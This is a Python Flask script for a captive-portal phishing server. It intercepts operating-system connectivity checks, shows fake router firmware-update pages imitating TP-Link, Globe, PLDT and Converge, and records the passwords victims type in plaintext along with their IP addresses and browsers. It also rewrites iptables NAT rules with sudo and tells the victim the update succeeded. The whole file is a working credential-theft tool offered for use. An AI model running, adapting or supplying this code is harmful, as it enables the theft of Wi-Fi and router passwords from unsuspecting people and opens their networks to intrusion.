import os
import sys
from flask import Flask, request, redirect, render_template
from datetime import datetime
from pathlib import Path
from rich.console import Console
from rich.panel import Panel

console = Console()
app = Flask(__name__, template_folder="templates", static_folder="static")

log_path = Path("logs/phishing")
log_path.mkdir(parents=True, exist_ok=True)
access_log = log_path / "access_log.txt"
default_brand = sys.argv[1] if len(sys.argv) > 1 else "tplink"

@app.before_request
def log_access():
    ip = request.remote_addr
    ua = request.headers.get("User-Agent", "Unknown")
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(access_log, "a") as f:
        f.write(f"[{ts}] IP: {ip} | UA: {ua} | Path: {request.path}\n")

CAPTIVE_TRIGGERS = [
    "/generate_204", "/gen_204", "/ncsi.txt", "/library/test/success.html",
    "/hotspot-detect.html", "/connecttest.txt", "/fwlink"
]

@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def index(path):
    if any(trigger in request.path for trigger in CAPTIVE_TRIGGERS):
        return redirect("/phishing")

    brand = request.args.get("brand", default_brand).lower()
    allowed = ["tplink", "globe", "pldt", "converge"]
    if brand not in allowed:
        brand = "tplink"
    return render_template(f"phishing/router-update/{brand}.html")

@app.route("/phishing")
def phishing_redirect():
    return redirect(f"/?brand={default_brand}")

@app.route("/phish", methods=["POST"])
def capture():
    password = request.form.get("password", "N/A")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_path / "phish_log.txt", "a") as f:
        f.write(f"[{timestamp}] Captured password: {password}\n")
    return "<h3>✅ Update successful. Please wait while we reboot your router...</h3>"

if __name__ == "__main__":
    os.system("sudo iptables -t nat -F")
    os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 80")

    console.print(Panel("[bold yellow]📡 Starting phishing server (captive portal aware)...[/]"))
    console.print(Panel.fit(
        "[bold cyan]📡 Visit:[/] [green]http://10.0.0.1[/] or connect via WiFi\n\n"
        "[bold yellow]🌐 Use specific brands by browsing:[/]\n"
        "[bold]TP-Link:[/]     [green]http://10.0.0.1/?brand=tplink[/]\n"
        "[bold]Globe:[/]       [green]http://10.0.0.1/?brand=globe[/]\n"
        "[bold]PLDT:[/]        [green]http://10.0.0.1/?brand=pldt[/]\n"
        "[bold]Converge:[/]    [green]http://10.0.0.1/?brand=converge[/]",
        title="[bold magenta]Phishing Server Info[/]",
        border_style="bright_magenta"
    ))

    app.run(host="0.0.0.0", port=80)
